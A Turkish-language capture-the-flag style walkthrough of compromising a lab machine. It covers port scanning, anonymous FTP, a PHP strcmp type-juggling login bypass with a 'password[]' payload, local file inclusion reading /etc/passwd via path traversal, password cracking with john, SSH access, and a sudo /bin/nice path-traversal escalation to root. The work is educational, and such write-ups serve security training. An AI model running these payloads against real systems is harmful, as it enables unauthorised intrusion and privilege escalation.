@@ -1,0 +1,214 @@
+      ####Enumeration
+
+Nmap
+Tüm TCP bağlantı noktalarına karşı bir tarama çalıştırarak başlıyoruz :
+kali@kali:~$ sudo nmap -p- $targetip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 08:48 EDT
+Nmap scan report for $targetip
+Host is up (0.038s latency).
+Not shown: 1997 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+2112/tcp open  kip
+Daha ayrıntılı bir tarama ile 2112 numaralı bağlantı noktasını daha da sıralayabiliriz:
+kali@kali:~$ sudo nmap -p 2112 $targetip -sC -sV
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 08:55 EDT
+Nmap scan report for $targetip
+Host is up (0.030s latency).
+
+PORT     STATE SERVICE VERSION
+2112/tcp open  ftp     ProFTPD
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--   1 ftp      ftp           901 Aug  2 19:33 index.php.bak
+|_-rw-r--r--   1 ftp      ftp            54 Aug  2 18:17 welcome.msg
+ProFTPD2112 numaralı bağlantı noktasında çalıştığını görüyoruz ve sunucu anonim kimlik doğrulamaya izin veriyor. Ek olarak, iki ilgi çekici dosya görebiliriz: index.php.bak ve welcome.msg .
+
+      ####Gobuster
+80 numaralı bağlantı noktasına (http://$targetip/) gitmek yararlı bir şey göstermez, ancak gobuster ile sitenin dizinlerini kaba kuvvet uygulamak için kullanabiliriz:
+kali@kali:~$ gobuster dir -u http://$targetip -w /usr/share/wordlists/dirb/common.txt -z
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+...
+/.hta (Status: 403)
+/.htpasswd (Status: 403)
+/admin (Status: 301)
+/.htaccess (Status: 403)
+/index.php (Status: 200)
+/server-status (Status: 403)
+...
+Bu tarama bize /admin dizinini gösterir . Oraya gidersek (http://$targetip/admin/), bir giriş kontrolü ile karşılaşıyoruz. Bazı kolay veya varsayılan şifreleri denemek faydalı olmaz.
+
+      ####Exploitation
+
+Anonim FTP Sunucusu
+Sunucunun anonim kimlik doğrulamayı desteklediğini keşfettiğimiz ProFTPDve orada barındırılan birkaç dosya gördüğümüz için, bunları inceleme için almayı deneyebiliriz:
+kali@kali:~$ ftp $targetip 2112
+Connected to $targetip.
+220 ProFTPD Server (Debian) [::ffff:$targetip]
+Name ($targetip:kali): anonymous
+331 Anonymous login ok, send your complete email address as your password
+Password:
+230-Welcome, archive user anonymous@$targetip !
+...
+ftp> ls
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+-rw-r--r--   1 ftp      ftp           901 Aug  2 19:33 index.php.bak
+-rw-r--r--   1 ftp      ftp            54 Aug  2 18:17 welcome.msg
+226 Transfer complete
+ftp> 
+ftp> get index.php.bak
+local: index.php.bak remote: index.php.bak
+200 PORT command successful
+150 Opening BINARY mode data connection for index.php.bak (901 bytes)
+226 Transfer complete
+901 bytes received in 0.00 secs (14.3210 MB/s)
+ftp> 
+ftp> get welcome.msg
+local: welcome.msg remote: welcome.msg
+200 PORT command successful
+150 Opening BINARY mode data connection for welcome.msg (54 bytes)
+226 Transfer complete
+54 bytes received in 0.00 secs (994.9882 kB/s)
+ftp> 
+ftp> bye
+221 Goodbye.
+kali@kali:~$ 
+Welcome.msg dosyasının bizim için hiçbir değeri yoktur; ancak, dosya index.php.bak değerli gibi görünüyor.
+
+PHP Tipi Sahtekarlık ve Kimlik Doğrulama Atlaması
+Dizin yedekleme dosyası şu ilgi alanlarını içerir:
+<?php
+
+$pass= "potato"; //note Change this password regularly
+
+if($_GET['login']==="1"){
+  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
+    echo "Welcome!  Go to the <a href=\"dashboard.php\">dashboard</a>";
+    setcookie('pass', $pass, time() + 365*24*3600);
+  }else{
+    echo "<p>Bad login/password!  Return to the <a href=\"index.php\">login page</a> <p>";
+  }
+  exit();
+}
+?>
+Açıklamada varsayılan şifreyi fark etmemize rağmen $pass= "potato";admin şifresi değişmiştir. Özellikle önemli olan satır 10:
+if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
+OWASP, bunun gibi bir kontrole karşı olası bir PHP tipi sahtekarlık saldırı vektörünü açıklayan çok bilgilendirici bir belgeye sahiptir.
+PHP'de iki tür karşılaştırma vardır: katı karşılaştırmalar (syntax kullanan ===) ve gevşek karşılaştırmalar (syntax kullanan ==). 
+Değerlendirmelerindeki farklılıklar çok önemlidir, özellikle de PHP Type Sahtekarlık ile ilgili olduğunda . 
+Kaynak koduna baktığımızda, kullanıcı adını dizeyle ve parolayı değişkenle karşılaştırmak için PHP dize karşılaştırıcı işlevinin strcmp kullanıldığını görüyoruz .admin$pass
+İşlev , her ikisi de string türünde olması gereken iki parametreyi kabul eder . strcmp Bu fonksiyonla oynarsak, parametreler string olmadığında gerçekten hoşlanmadığını fark edeceğiz. 
+NULL Özellikle, bir parametre bir dizi ise işlev vazgeçecek ve geri dönecektir :
+kali@kali:~$ php -a
+Interactive mode enabled
+
+php > $test = strcmp(array(), "password");
+PHP Warning:  strcmp() expects parameter 1 to be string, array given in php shell code on line 1
+php > echo $test === NULL;
+1
+php >
+Bunu daha fazla test ederek , gevşek karşılaştırma ( ) kullanırken NULLbunun tam sayıya eşit olduğunu görüyoruz - yedekleme dosyasında olduğu gibi:0==
+php > echo (NULL == 0);
+1
+php >
+Uygulama sıkı karşılaştırmalar kullansaydı, bu güvenlik açığı olmayacaktı. Parola POST değişkenini tamamen kontrol $_POST['password']ettiğimiz için, isteği durdurabilir ve boş bir diziye değiştirebiliriz.
+Sonuç olarak, ifade strcmp($_POST['password'], $pass)bunu değerlendirecek NULLve gevşek karşılaştırma nedeniyle, strcmp($_POST['password'], $pass) == 0 doğrulama esasen kimlik doğrulamasını tamamen atlayarak geçecekti.
+Ardından, web tarayıcımızı Burp proxy kullanacak ve oturum açma isteğini engelleyecek şekilde ayarlayacağız:
+POST /admin/index.php?login=1 HTTP/1.1
+Host: $targetip
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://$targetip/admin/index.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+username=admin&password=test
+Engellenen isteği sunucuya iletmeden önce aşağıdaki şekilde değiştireceğiz:
+POST /admin/index.php?login=1 HTTP/1.1
+...
+
+username=admin&password[]=""
+Sonuç olarak, kimlik doğrulamasını başarıyla atladık ve http://$targetip/admin/index.php?login=1 adresine yönlendirildik, burada aşağıdakilerle karşılaşıyoruz:
+Welcome!
+Go to the dashboard
+Bağlantıyı takip edeceğiz ve beş ek bağlantı gördüğümüz kontrol paneli sayfasına (http://$targetip/admin/dashboard.php) gideceğiz: Home, Users, Date, Logs ve Ping.
+
+LFI Güvenlik Açığı
+Hala Burpproxy kullanıyorsak, sunucuya gönderilen istekleri gözlemleyerek bu sayfaları inceleyeceğiz. 
+Sayfa ( Logshttp://$targetip/admin/dashboard.php?page=log) işlevi dikkatimizi çekmelidir. Burada listelenen üç günlük dosyası görüyoruz: log_01.txt , log_02.txt ve log_03.txt .
+Bu loglardan birini seçip Get the log butonuna tıklarsak POST isteği şu şekilde görünecektir:
+POST /admin/dashboard.php?page=log HTTP/1.1
+...
+
+file=log_01.txt
+İstekte POST parametresini gözlemliyoruz fileve bu, yerel bir dosya ekleme güvenlik açığı olasılığına işaret ediyor. Yakalanan POST verilerinin değiştirilmesi bunu doğrular ve /etc/passwdfile=../../../../../etc/passwd içeriğini alırız :
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+ftp:x:113:65534::/srv/ftp:/usr/sbin/nologin
+webadmin:$hashcensored/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
+
+      ####Password Cracking
+webadmin kullanıcı için kurtarılan şifre karmasını john ve varsayılan kelime listesini kullanarak kırmaya çalışacağız :
+kali@kali:~$ cat pass.txt 
+webadmin:$hashcensored/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
+kali@kali:~$ 
+kali@kali:~$ john pass.txt
+...
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+dragon           (webadmin)
+1g 0:00:00:00 DONE 2/3 (2020-09-25 10:08) 33.33g/s 35933p/s 35933c/s 35933C/s 123456..knight
+...
+Şifre kırıcı şifreyle birlikte geri gelir $passwordcensored.
+
+      ####SSH
+Artık kimlik bilgileriyle makineye SSH yapabiliriz webadmin:$passwordcensored:
+kali@kali:~$ ssh webadmin@$targetip
+webadmin@$targetip's password: 
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
+...
+webadmin@serv:~$ id
+uid=1001(webadmin) gid=1001(webadmin) groups=1001(webadmin)
+webadmin@serv:~$
+
+
+      ####Sudo Enumeration
+Sudo izinlerimizi kontrol etmek ve /notes dizinindeki tüm dosyaları /bin/nice kullanarak çalıştırabildiğimizi gösterir :
+webadmin@serv:~$ sudo -l
+[sudo] password for webadmin: 
+Matching Defaults entries for webadmin on serv:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User webadmin may run the following commands on serv:
+    (ALL : ALL) /bin/nice /notes/*
+webadmin@serv:~$
+/notes üzerindeki izinleri kontrol ederken, o dizine yazamıyoruz:
+webadmin@serv:~$ ls -lah /notes/
+total 16K
+drwxr-xr-x  2 root root 4.0K Aug  2 19:11 .
+drwxr-xr-x 21 root root 4.0K Sep 20 16:18 ..
+-rwx------  1 root root   11 Aug  2 19:11 clear.sh
+-rwx------  1 root root    8 Aug  2 19:11 id.sh
+webadmin@serv:~$
+Ancak, bu kısıtlamayı atlamak için bir dizin geçiş hilesi kullanabiliriz. İlk olarak, ana dizinde çalıştırmak istediğimiz bir dosya oluşturun ve yürütülebilir izinler verin:
+webadmin@serv:~$ pwd
+/home/webadmin
+webadmin@serv:~$ echo "/bin/bash" > pwn.sh
+webadmin@serv:~$ cat pwn.sh 
+/bin/bash
+webadmin@serv:~$ chmod +x pwn.sh
+webadmin@serv:~$
+Artık dizin yazma kısıtlamasını atlayarak ve bize bir kök kabuğu vererek dosyamıza aşağıdaki yolu kullanabiliriz:
+webadmin@serv:~$ whoami
+webadmin
+webadmin@serv:~$ sudo /bin/nice /notes/../home/webadmin/pwn.sh 
+root@serv:/home/webadmin# id
+uid=0(root) gid=0(root) groups=0(root)
+root@serv:/home/webadmin# 
